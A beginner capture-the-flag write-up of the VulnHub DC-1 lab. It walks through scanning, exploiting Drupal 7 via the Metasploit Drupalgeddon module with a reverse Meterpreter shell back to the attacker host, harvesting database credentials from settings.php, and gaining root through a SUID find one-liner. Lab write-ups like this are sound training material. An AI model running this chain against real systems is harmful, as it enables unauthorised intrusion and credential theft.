# DC-1 — VulnHub Writeup

**Difficulty:** Beginner  
**Machine:** DC-1 (VulnHub)  
**Date:** April 2026  
**Target IP:** 10.70.32.211  
**Attacker IP:** 10.70.32.197  

---

## Summary

DC-1 is a beginner-friendly VulnHub machine running Drupal 7. Exploited
CVE-2014-3704 (Drupalgeddon — SQL Injection) via Metasploit to land a
www-data shell, discovered database credentials inside the CMS config
file, then escalated to root by abusing a SUID bit on the find binary.

---

## Tools Used

- Netdiscover
- Nmap
- Searchsploit
- Metasploit Framework
- GTFOBins (reference)

---

## Step 1 — Host Discovery

```bash
sudo netdiscover -r 10.70.32.0/24
```

Scanned the local subnet and identified the target at **10.70.32.211**.

---

## Step 2 — Nmap Scan

```bash
nmap -sC -sV -p- 10.70.32.211
```

**Output:**
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey:
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-generator: Drupal 7
|http-title: Welcome to Drupal Site | Drupal Site
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
|/INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
111/tcp   open  rpcbind 2-4 (RPC #100000)
49926/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:1B:9F:E4 (VMware)

Port 80 running Apache with Drupal 7 — confirmed by `http-generator`
header. `robots.txt` exposes `/CHANGELOG.txt` which reveals the exact
Drupal version.

---

## Step 3 — Searchsploit

```bash
searchsploit drupal 7
```

Multiple exploits found for Drupal 7. Went with the SQL Injection
based Drupalgeddon exploit targeting Drupal 7.0 - 7.31.

---

## Step 4 — Exploitation via Metasploit

```bash
msfconsole
search drupal 7
use exploit/multi/http/drupal_drupageddon
set PAYLOAD php/meterpreter/reverse_tcp
set RHOST 10.70.32.211
set LHOST 10.70.32.197
run
```

**Output:**
[] Started reverse TCP handler on 10.70.32.197:4444
[] Sending stage (42137 bytes) to 10.70.32.211
[*] Meterpreter session 1 opened (10.70.32.197:4444 -> 10.70.32.211:46542)

Successfully opened a Meterpreter session as **www-data**.

---

## Step 5 — Flag 1

```bash
shell
whoami
# www-data

cat flag1.txt
# Every good CMS needs a config file - and so do you.
```

Flag 1 hints to look at the CMS configuration file.

---

## Step 6 — Flag 2 & Database Credentials

```bash
cd sites/default
cat settings.php
```

Found **flag2** and database credentials:
flag2
Brute force and dictionary attacks aren't the only ways to gain
access (and you WILL need access). What can you do with these credentials?
database: drupaldb
username: dbuser
password: R0ck3t
host:     localhost

---

## Step 7 — Privilege Escalation (SUID find)

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Relevant output:**
/usr/bin/find

`/usr/bin/find` has SUID bit set — runs with root privileges.
Used GTFOBins technique to escalate:

```bash
/usr/bin/find . -exec /bin/bash -p \; -quit

whoami
# root
```

---

## Step 8 — Root Flag

```bash
cd /root
ls
# thefinalflag.txt

cat thefinalflag.txt
# Well done!!!!
# Hopefully you've enjoyed this and learned some new skills.
# You can let me know what you thought of this little journey
# by contacting me via Twitter - @DCAU7
```

Machine fully compromised.

---

## Key Takeaways

- Netdiscover is fast and reliable for local subnet host discovery
- Always check service versions — Drupal exposes its exact version
  via `/CHANGELOG.txt` listed in robots.txt
- Drupal 7.0–7.31 is vulnerable to SQL injection via CVE-2014-3704
  (Drupalgeddon) — a classic exploit worth knowing
- CMS config files almost always contain credentials — always read them
- SUID binaries are a high-priority privesc target — always run
  `find / -perm -u=s -type f 2>/dev/null` early
- GTFOBins is essential — bookmark it
